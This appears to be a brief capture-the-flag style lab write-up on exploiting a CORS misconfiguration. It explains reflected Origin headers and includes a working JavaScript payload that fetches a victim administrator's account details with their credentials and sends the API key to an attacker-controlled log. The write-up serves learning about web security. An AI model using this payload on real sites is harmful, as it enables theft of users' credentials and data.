# CORS 
CORS (Cross-Origin Resource Sharing) is a security feature implemented by web browsers to restrict web pages from making requests to a domain different from the one that served the web page. This is done to prevent unauthorized access to resources or data on another domain, thus protecting against security risks like cross-site request forgery (CSRF) or data leakage.

# Adding origin: https://malicious.com

![image](https://github.com/user-attachments/assets/e6f0e26c-7d78-4879-929f-c1ca84678f72)


# If Access-Control-Allow-Origin: https://malicious.com, the website accepts CORS

![image](https://github.com/user-attachments/assets/d631b4aa-9eef-4434-a4c0-674fabe338e2)

# Sending the malicious javascript to administrator to get administrator's API key

```
<script>
    var req = new XMLHttpRequest();
    req.onload = reqListener;
    req.open('get','https://0ab300460480632d8167fc370008009c.web-security-academy.net/accountDetails',true);
    req.withCredentials = true;
    req.send();

    function reqListener() {
        location='/log?key='+this.responseText;
    };
</script>
```

When you look back into access-log, you will see administrator's API key
